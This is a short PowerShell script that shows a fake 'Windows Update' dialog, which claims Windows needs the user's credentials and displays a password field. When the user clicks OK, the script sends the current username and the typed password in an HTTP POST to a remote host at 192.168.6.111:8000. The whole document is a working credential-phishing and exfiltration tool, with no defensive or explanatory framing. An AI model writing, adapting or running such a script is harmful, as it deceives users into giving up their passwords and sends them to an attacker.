Add-Type -AssemblyName PresentationFramework
$username = $env:USERNAME

[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        Title="Windows Update" Height="180" Width="400" WindowStartupLocation="CenterScreen"
        ResizeMode="NoResize" Topmost="True" WindowStyle="ToolWindow">
    <Grid Margin="10">
        <TextBlock Text="Windows needs your credentials to continue this update." FontSize="14" Margin="0,0,0,30"/>
        <PasswordBox Name="PasswordInput" Margin="0,30,0,0"/>
        <Button Content="OK" Width="80" Height="30" HorizontalAlignment="Right" VerticalAlignment="Bottom" Margin="0,0,0,0" Name="OKButton"/>
    </Grid>
</Window>
"@

$reader=(New-Object System.Xml.XmlNodeReader $xaml)
$Form=[Windows.Markup.XamlReader]::Load($reader)
$pwBox = $Form.FindName("PasswordInput")
$okBtn = $Form.FindName("OKButton")

$okBtn.Add_Click({
    $password = $pwBox.Password
    $creds = "User: $username`nPass: $password"
    Invoke-WebRequest -Uri "http://192.168.6.111:8000/upload" -Method POST -Body $creds -UseBasicParsing
    $Form.Close()
})

$Form.ShowDialog() | Out-Null
